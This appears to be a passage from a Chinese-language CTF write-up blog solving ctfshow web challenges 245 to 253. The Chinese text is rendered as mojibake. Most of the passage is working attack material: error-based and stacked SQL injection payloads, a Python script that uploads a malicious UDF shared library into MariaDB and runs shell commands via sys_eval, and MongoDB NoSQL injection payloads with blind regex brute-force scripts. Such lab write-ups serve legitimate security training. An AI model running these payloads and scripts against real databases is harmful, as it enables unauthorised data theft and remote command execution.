id=&#39; and (select extractvalue(1,concat(0x7e,(select substr(group_concat(flag1),1,30) from ctfshow_flagsa))))%23
id=&#39; and (select extractvalue(1,concat(0x7e,(select substr(group_concat(flag1),31,30) from ctfshow_flagsa))))%23

//ctfshow{41446106-c47e-434d-a0c0-16ee43375249}
</code></pre><h4 id="web246">web246<a hidden class="anchor" aria-hidden="true" href="#web246">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">sqlè¯­å¥</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  
</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select id,username,pass from ctfshow_user where id = &#39;&#34;</span><span class="o">.</span><span class="nv">$id</span><span class="o">.</span><span class="s2">&#34;&#39; limit 1;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">è¿”å›é€»è¾‘</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//æ— è¿‡æ»¤
</span></span></span><span class="line"><span class="ln">9</span><span class="cl"><span class="c1"></span>  <span class="nx">è¿‡æ»¤updatexml</span> <span class="nx">extractvalue</span>
</span></span></code></pre></div><p>flooræŠ¥é”™æ³¨å…¥</p>
<p>åŸç†ï¼š<a href="https://blog.csdn.net/miraclehw/article/details/129250360">SQLæ³¨å…¥æŠ¥é”™æ³¨å…¥ä¹‹floor()æŠ¥é”™æ³¨å…¥åŸç†åˆ†æ_sqlæ³¨å…¥floor-CSDNåšå®¢</a></p>
<pre tabindex="0"><code>#è·å–è¡¨å
1&#39; union select 1,count(*),concat(0x3a,0x3a,(select (table_name) from information_schema.tables where table_schema=database()  limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23

#è·å–åˆ—å
1&#39; union select 1,count(*),concat(0x3a,0x3a,(select (column_name) from information_schema.columns where table_name=&#39;ctfshow_flags&#39;  limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23

#è·å–æ•°æ®
1&#39; union select 1,count(*),concat(0x3a,0x3a,(select (flag2) from ctfshow_flags  limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23
</code></pre><h4 id="web247">web247<a hidden class="anchor" aria-hidden="true" href="#web247">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">sqlè¯­å¥</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  
</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select id,username,pass from ctfshow_user where id = &#39;&#34;</span><span class="o">.</span><span class="nv">$id</span><span class="o">.</span><span class="s2">&#34;&#39; limit 1;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">è¿”å›é€»è¾‘</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//æ— è¿‡æ»¤
</span></span></span><span class="line"><span class="ln">9</span><span class="cl"><span class="c1"></span>  <span class="nx">è¿‡æ»¤updatexml</span> <span class="nx">extractvalue</span> <span class="nx">floor</span>
</span></span></code></pre></div><p>è¿™é“é¢˜floorå‡½æ•°ä¹Ÿè¢«banæ‰äº†</p>
<p>æ ¹æ®flooræŠ¥é”™æ³¨å…¥çš„åŸç†ï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œä¹‹æ‰€ä»¥ä¼šå‡ºç°é”™è¯¯ä¸»è¦æ˜¯å› ä¸ºç”¨floorå¯¹rand(0)*2è¿›è¡Œå–æ•´ï¼Œç›®çš„è¾“å‡º011011&hellip;çš„ç»“æœï¼Œè€Œæ—¢ç„¶è¿™æ ·æˆ‘ä»¬åªéœ€è¦æ‰¾ä¸€ä¸ªåŒæ ·èƒ½è¿›è¡Œå–æ•´çš„å‡½æ•°æ¥ä»£æ›¿floorå°±okäº†</p>
<p>é™¤äº†floorä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜èƒ½ä½¿ç”¨roundï¼Œceilç­‰</p>
<p>payload</p>
<pre tabindex="0"><code>æŸ¥è¡¨ 
1&#39; union select 1,count(*),concat(0x3a,0x3a,(select (table_name) from information_schema.tables where table_schema=database()  limit 1,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23
æŸ¥åˆ— 
1&#39; union select 1,count(*),concat(0x3a,0x3a,(select (column_name) from information_schema.columns where table_name=&#39;ctfshow_flagsa&#39;  limit 1,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23
æŸ¥æ•°æ® 
1&#39; union select 1,count(*),concat(0x3a,0x3a,(select (`flag?`) from ctfshow_flagsa  limit 0,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23
</code></pre><h4 id="web248">web248<a hidden class="anchor" aria-hidden="true" href="#web248">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">sqlè¯­å¥</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  
</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select id,username,pass from ctfshow_user where id = &#39;&#34;</span><span class="o">.</span><span class="nv">$id</span><span class="o">.</span><span class="s2">&#34;&#39; limit 1;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">è¿”å›é€»è¾‘</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//æ— è¿‡æ»¤,
</span></span></span></code></pre></div><p>UDFæ³¨å…¥</p>
<p><a href="https://blog.csdn.net/Myon5/article/details/142146339">ctfshow-webå…¥é—¨-sqlæ³¨å…¥-web248-UDF æ³¨å…¥_ctfshow web248-CSDNåšå®¢</a></p>
<p>æˆ‘ä»¬éœ€è¦å°† UDF çš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼ˆxxx.dllæ–‡ä»¶ï¼‰æ”¾åˆ° MySQL çš„æ£€ç´¢ç›®å½•ä¸‹æ‰èƒ½åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°ï¼Œå¯¹äºä¸åŒç‰ˆæœ¬çš„ mysqlï¼Œæ£€ç´¢ç›®å½•æ˜¯ä¸åŒçš„ï¼š</p>
<blockquote>
<p>MySQL &lt; 5.0	å¯¼å‡ºè·¯å¾„éšæ„ï¼›
5.0 &lt;= MySQL&lt; 5.1	éœ€è¦å¯¼å‡ºè‡³ç›®æ ‡æœåŠ¡å™¨çš„ç³»ç»Ÿç›®å½•ï¼ˆå¦‚ï¼šc:/windows/system32/ï¼‰
5.1 &lt; MySQL	å¿…é¡»å¯¼å‡ºåˆ°MySQLå®‰è£…ç›®å½•ä¸‹çš„lib\pluginæ–‡ä»¶å¤¹ä¸‹</p></blockquote>
<p>å †å æ³¨å…¥æŸ¥ç‰ˆæœ¬</p>
<pre tabindex="0"><code>/api/?id=0&#39;;select version();%23
</code></pre><p><img alt="image-20250218215235779" loading="lazy" src="./assets/image-20250218215235779.png"></p>
<p>å¤§äº5.1ï¼Œæ¥ç€è¦æŸ¥ç›®å½•è·¯å¾„</p>
<pre tabindex="0"><code>/api/?id=0&#39;;select @@plugin_dir;%23
</code></pre><p><img alt="image-20250218215447848" loading="lazy" src="./assets/image-20250218215447848.png"></p>
<pre tabindex="0"><code>/usr/lib/mariadb/plugin
</code></pre><p>æ‹¿åˆ°è·¯å¾„ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥å°±å¯ä»¥ä¼ å…¥æˆ‘ä»¬çš„æ¶æ„soæ–‡ä»¶äº†</p>
<p>sqlmapä¸­æœ‰å·²ç»å†™å¥½çš„ udf æ–‡ä»¶</p>
<p>å¦‚ï¼Œlib_mysqludf_sys_64.so</p>
<p><img alt="image-20250218220305454" loading="lazy" src="./assets/image-20250218220305454.png"></p>
<p>ä½†æ˜¯ç”±äºgetä¼ å‚æœ‰é•¿åº¦é™åˆ¶ï¼Œæˆ‘ä»¬éœ€è¦è¿›è¡Œåˆ†æ®µä¼ å‚</p>
<p>æ”¾ä¸€ä¸ªå›½å¤–å¤§ä½¬çš„è„šæœ¬ï¼Œå°†udfæ–‡ä»¶åˆ†æ®µä¸Šä¼ åå†è¿›è¡Œåˆå¹¶å³å¯</p>
<pre tabindex="0"><code>import requests
url=&#34;http://449c0852-2873-4a47-9eb4-a854915a6b40.challenge.ctf.show/api/&#34;
udf=&#34;&#34;
udfs=[]
for i in range(0,len(udf),5000):
    udfs.append(udf[i:i+5000])
#å†™å…¥å¤šä¸ªæ–‡ä»¶ä¸­
for i in udfs:
    url1=url+f&#34;?id=1&#39;;SELECT &#39;{i}&#39; into dumpfile &#39;/tmp/&#34;+str(udfs.index(i))+&#34;.txt&#39;%23&#34;
    requests.get(url1)

#åˆå¹¶æ–‡ä»¶ç”Ÿæˆsoæ–‡ä»¶
url2=url+&#34;?id=1&#39;;SELECT unhex(concat(load_file(&#39;/tmp/0.txt&#39;),load_file(&#39;/tmp/1.txt&#39;),load_file(&#39;/tmp/2.txt&#39;),load_file(&#39;/tmp/3.txt&#39;))) into dumpfile &#39;/usr/lib/mariadb/plugin/hack.so&#39;%23&#34;
requests.get(url2)

#åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°å¹¶æ‰§è¡Œæ¶æ„å‘½ä»¤
requests.get(url+&#34;?id=1&#39;;create function sys_eval returns string soname &#39;hack.so&#39;%23&#34;)
r=requests.get(url+&#34;?id=1&#39;;select sys_eval(&#39;cat /f*&#39;)%23&#34;)
print(r.text)
</code></pre><h4 id="web249">web249<a hidden class="anchor" aria-hidden="true" href="#web249">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">sqlè¯­å¥</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="c1">//æ— 
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span>  <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$memcache</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">è¿”å›é€»è¾‘</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//æ— è¿‡æ»¤
</span></span></span></code></pre></div><p><img alt="image-20250218221510397" loading="lazy" src="./assets/image-20250218221510397.png"></p>
<p>payload:</p>
<pre tabindex="0"><code>?id[]=flag
</code></pre><h4 id="web250">web250<a hidden class="anchor" aria-hidden="true" href="#web250">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">sqlè¯­å¥</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="nv">$query</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MongoDB\Driver\Query</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">  <span class="nv">$cursor</span> <span class="o">=</span> <span class="nv">$manager</span><span class="o">-&gt;</span><span class="na">executeQuery</span><span class="p">(</span><span class="s1">&#39;ctfshow.ctfshow_user&#39;</span><span class="p">,</span> <span class="nv">$query</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">toArray</span><span class="p">();</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">è¿”å›é€»è¾‘</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//æ— è¿‡æ»¤
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$cursor</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;ç™»é™†æˆåŠŸ&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="nx">array_push</span><span class="p">(</span><span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">],</span> <span class="nv">$flag</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><p><a href="https://blog.csdn.net/Myon5/article/details/142187219">ctfshow-webå…¥é—¨-sqlæ³¨å…¥ï¼ˆweb249-web253ï¼‰nosql æ³¨å…¥_ctfshow web250-CSDNåšå®¢</a></p>
<p><img alt="image-20250218222341349" loading="lazy" src="./assets/image-20250218222341349.png"></p>
<p>åœ¨è¿™äº›æ“ä½œç¬¦ä¸­ï¼Œ$ne å°±æ˜¯æˆ‘ä»¬åœ¨<strong>é‡è¨€å¼æ³¨å…¥</strong>ä¸­éœ€è¦åˆ©ç”¨åˆ°çš„é‚£ä¸ªï¼Œå®ƒçš„ä½œç”¨æ˜¯å°†ä¸ç­‰äºæŒ‡å®šå€¼çš„æ•°æ®éƒ½æŸ¥è¯¢å‡ºæ¥ï¼Œæ¯”å¦‚ $ne=1 æ—¶å°±æ˜¯å°†æ‰€æœ‰ä¸ç­‰äº 1 çš„æ•°æ®éƒ½æŸ¥è¯¢å‡ºæ¥ã€‚</p>
<p>æ‰€ä»¥payloadå°±æ˜¯</p>
<pre tabindex="0"><code>username[$ne]=1&amp;password[$ne]=1
</code></pre><p>ç¯å¢ƒå¥½åƒæœ‰ç‚¹é—®é¢˜ï¼ˆï¼Ÿï¼‰å‰ä¸¤æ¬¡ä¸€ç›´æŸ¥ä¸å‡ºæ¥</p>
<h4 id="web251">web251<a hidden class="anchor" aria-hidden="true" href="#web251">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">sqlè¯­å¥</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="nv">$query</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MongoDB\Driver\Query</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">  <span class="nv">$cursor</span> <span class="o">=</span> <span class="nv">$manager</span><span class="o">-&gt;</span><span class="na">executeQuery</span><span class="p">(</span><span class="s1">&#39;ctfshow.ctfshow_user&#39;</span><span class="p">,</span> <span class="nv">$query</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">toArray</span><span class="p">();</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">è¿”å›é€»è¾‘</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//æ— è¿‡æ»¤
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$cursor</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;ç™»é™†æˆåŠŸ&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="nx">array_push</span><span class="p">(</span><span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">],</span> <span class="nv">$flag</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><p>åŒæ ·æ˜¯</p>
<pre tabindex="0"><code>username[$ne]=1&amp;password[$ne]=1
</code></pre><p><img alt="image-20250218225117048" loading="lazy" src="./assets/image-20250218225117048.png"></p>
<p>ç»§ç»­ç”¨ä¸Šä¸€é¢˜çš„ payloadï¼Œè¿”å› admin çš„å¯†ç ï¼Œä½†æ˜¯è¿™æ¬¡çš„å¯†ç é‡Œæ²¡æœ‰ flag</p>
<p>å¯èƒ½flagåœ¨å…¶ä»–ç”¨æˆ·çš„å¯†ç é‡Œï¼Œæˆ‘ä»¬ç¦ç”¨admin</p>
<pre tabindex="0"><code>username[$ne]=admin&amp;password[$ne]=1
</code></pre><p><img alt="image-20250218225555688" loading="lazy" src="./assets/image-20250218225555688.png"></p>
<p>æ‹¿åˆ°flag</p>
<h4 id="web252">web252<a hidden class="anchor" aria-hidden="true" href="#web252">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">sqlè¯­å¥</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="nv">$query</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MongoDB\Driver\Query</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">  <span class="nv">$cursor</span> <span class="o">=</span> <span class="nv">$manager</span><span class="o">-&gt;</span><span class="na">executeQuery</span><span class="p">(</span><span class="s1">&#39;ctfshow.ctfshow_user&#39;</span><span class="p">,</span> <span class="nv">$query</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">toArray</span><span class="p">();</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">è¿”å›é€»è¾‘</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//æ— è¿‡æ»¤
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$cursor</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;ç™»é™†æˆåŠŸ&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="nx">array_push</span><span class="p">(</span><span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">],</span> <span class="nv">$flag</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">      
</span></span></code></pre></div><p>è¿™é¢˜æœ‰å¾ˆå¤šä¸åŒçš„username</p>
<p>æˆ‘ä»¬å¯ä»¥è€ƒè™‘é‡‡ç”¨æ­£åˆ™åŒ¹é…æ¥ç­›é€‰</p>
<pre tabindex="0"><code>username[$ne]=1&amp;password[$regex]=ctfshow{
</code></pre><p>or</p>
<p>ç”¨$gt ï¼ˆå¤§äºï¼‰ä¸€ç›´å°è¯•çŸ¥é“æ‹¿åˆ°æœ‰flagçš„ç”¨æˆ·</p>
<pre tabindex="0"><code>username[$ne]=admin&amp;password[$ne]=1
username[$gt]=admin1&amp;password[$ne]=1
username[$gt]=admin2&amp;password[$ne]=1
username[$gt]=admin3&amp;password[$ne]=1
</code></pre><p>or</p>
<p>æ­£åˆ™åŒ¹é…å»æ‰æ‰€æœ‰ä¸ºadminå¼€å¤´çš„ç”¨æˆ·</p>
<pre tabindex="0"><code>username[$regex]=^[^admin].*$&amp;password[$ne]=1
</code></pre><h4 id="web253">web253<a hidden class="anchor" aria-hidden="true" href="#web253">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">sqlè¯­å¥</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="c1">//sql
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span>  <span class="nx">db</span><span class="o">.</span><span class="nx">ctfshow_user</span><span class="o">.</span><span class="nx">find</span><span class="p">({</span><span class="nx">username</span><span class="o">:</span><span class="s1">&#39;$username&#39;</span><span class="p">,</span><span class="nx">password</span><span class="o">:</span><span class="s1">&#39;$password&#39;</span><span class="p">})</span><span class="o">.</span><span class="nx">pretty</span><span class="p">()</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">è¿”å›é€»è¾‘</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//æ— è¿‡æ»¤
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$cursor</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;ç™»é™†æˆåŠŸ&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="nx">array_push</span><span class="p">(</span><span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">],</span> <span class="nv">$flag</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><h5 id="æ–¹æ³•ä¸€-1">æ–¹æ³•ä¸€<a hidden class="anchor" aria-hidden="true" href="#æ–¹æ³•ä¸€-1">#</a></h5>
<p><a href="https://www.cnblogs.com/recharging-runtime/p/15077477.html">CTFSHOW WEBå…¥é—¨ SQLæ³¨å…¥ç¯‡ - b477eRy - åšå®¢å›­</a></p>
<p>çŒœæµ‹åˆ°idä¸ºflagï¼Œç›´æ¥å¸ƒå°”ç›²æ³¨æ‹¿åˆ°flag</p>
<pre tabindex="0"><code>import string

import requests

url = &#34;http://5ce4ea0d-afb5-4f1c-9e65-626bdaa6e433.challenge.ctf.show:8080/api/&#34;

letters = &#34;{}-_&#34; + string.ascii_lowercase + string.digits


def valid_pass(password: str) -&gt; bool:
    data = {
        &#34;username[$regex]&#34;: &#34;flag&#34;,
        &#34;password[$regex]&#34;: f&#34;{password}.*&#34;
    }
    response = requests.post(url, data=data)
    return &#34;ç™»é™†æˆåŠŸ&#34; in response.json()[&#34;msg&#34;]


result = &#34;&#34;

while True:
    for letter in letters:
        if valid_pass(result + letter):
            result += letter
            print(f&#34;[*] result: {result}&#34;)
            break
</code></pre><h5 id="æ–¹æ³•äºŒ">æ–¹æ³•äºŒ<a hidden class="anchor" aria-hidden="true" href="#æ–¹æ³•äºŒ">#</a></h5>
<pre tabindex="0"><code>import requests, time, json


def brute(action, username=&#34;&#34;):
    url = &#34;http://44e163eb-3f69-4641-83b2-5499d9c0d5ed.challenge.ctf.show/api/&#34;
    if action == &#34;username&#34;:
        res = &#34;^[^a]&#34;  # admin1çš„passwordä¸ºctfshow666...å¾ˆæ˜æ˜¾ä¸æ˜¯flagï¼Œæ‰€ä»¥ç¦æ‰adminå¼€å¤´çš„ç”¨æˆ·
    else:
        res = &#34;^ctfshow{&#34;
    for j in range(30):
        flag = False
        for i in range(127):
            reg = res
            if chr(i) not in &#34;0123456789abcdefghijklmnopqrstuvwxyz-{}:,_&#34;:
                continue
            n = chr(i)
            if chr(i) in &#34;-{}:&#34;:
                n = &#34;\\&#34;+chr(i)
            print(chr(i))
            if action == &#34;username&#34;:
                data = {&#34;username[$regex]&#34;: f&#34;{reg+n}&#34;, &#34;password[$ne]&#34;: f&#34;1&#34;}
            else:
                data = {&#34;username[$regex]&#34;: f&#34;{username}$&#34;, &#34;password[$regex]&#34;: f&#34;{reg+n}&#34;}
            while True:
                try:
                    r = requests.post(url, data=data, timeout=7)
                    break
                except TimeoutError:
                    time.sleep(0.1)
                except KeyboardInterrupt:
                    exit(0)
            try:
                resp = json.loads(r.text)
            except:
                resp = None
                continue
            if resp[&#34;msg&#34;] == &#34;\u767b\u9646\u6210\u529f&#34;:
                res += chr(i)
                flag = True
                break
        if not flag:
            break
        print(res)
    return res


if __name__ == &#39;__main__&#39;:
    username = brute(&#34;username&#34;)
    print(f&#34;ç”¨æˆ·åä¸º: {username}&#34;)
    password = brute(&#34;password&#34;, username)
    print(f&#34;ç”¨æˆ·å: {username}\nå¯†ç : {password}&#34;)
</code></pre><h3 id="ååºåˆ—åŒ–">ååºåˆ—åŒ–<a hidden class="anchor" aria-hidden="true" href="#ååºåˆ—åŒ–">#</a></h3>
<h4 id="phpçš„é­”æ³•æ–¹æ³•">PHPçš„é­”æ³•æ–¹æ³•<a hidden class="anchor" aria-hidden="true" href="#phpçš„é­”æ³•æ–¹æ³•">#</a></h4>
<p>PHP å°†æ‰€æœ‰ä»¥ __ï¼ˆä¸¤ä¸ªä¸‹åˆ’çº¿ï¼‰å¼€å¤´çš„ç±»æ–¹æ³•ä¿ç•™ä¸ºé­”æœ¯æ–¹æ³•ã€‚æ‰€ä»¥åœ¨å®šä¹‰ç±»æ–¹æ³•æ—¶ï¼Œé™¤äº†ä¸Šè¿°é­”æœ¯æ–¹æ³•ï¼Œå»ºè®®ä¸è¦ä»¥ __ ä¸ºå‰ç¼€ã€‚ å¸¸è§çš„é­”æ³•æ–¹æ³•å¦‚ä¸‹ï¼š</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-scss" data-lang="scss"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nt">__construct</span><span class="o">()</span><span class="err">ï¼Œ</span><span class="nt">ç±»çš„æ„é€ å‡½æ•°</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nt">__destruct</span><span class="o">()</span><span class="err">ï¼Œ</span><span class="nt">ç±»çš„ææ„å‡½æ•°</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nt">__call</span><span class="o">()</span><span class="err">ï¼Œ</span><span class="nt">åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="nt">__callStatic</span><span class="o">()</span><span class="err">ï¼Œ</span><span class="nt">ç”¨é™æ€æ–¹å¼ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="nt">__get</span><span class="o">()</span><span class="err">ï¼Œ</span><span class="nt">è·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="nt">__set</span><span class="o">()</span><span class="err">ï¼Œ</span><span class="nt">è®¾ç½®ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nt">__isset</span><span class="o">()</span><span class="err">ï¼Œ</span><span class="nt">å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨isset</span><span class="o">()</span><span class="nt">æˆ–empty</span><span class="o">()</span><span class="nt">æ—¶è°ƒç”¨</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nt">__unset</span><span class="o">()</span><span class="err">ï¼Œ</span><span class="nt">å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨unset</span><span class="o">()</span><span class="nt">æ—¶è¢«è°ƒç”¨</span><span class="err">ã€‚</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">
